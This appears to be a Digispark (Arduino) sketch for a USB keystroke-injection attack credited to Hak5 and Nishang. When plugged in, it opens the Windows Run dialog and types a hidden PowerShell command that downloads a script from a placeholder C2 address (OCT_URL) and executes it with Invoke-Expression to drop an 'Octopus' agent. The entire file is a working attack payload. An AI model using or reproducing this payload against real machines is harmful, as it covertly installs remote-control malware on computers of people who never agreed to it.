// Drop Octopus agent via keystrokes (HID Attack)
// Credits to hak5 and samratashok (developer of the nishang framework).

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden \"$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
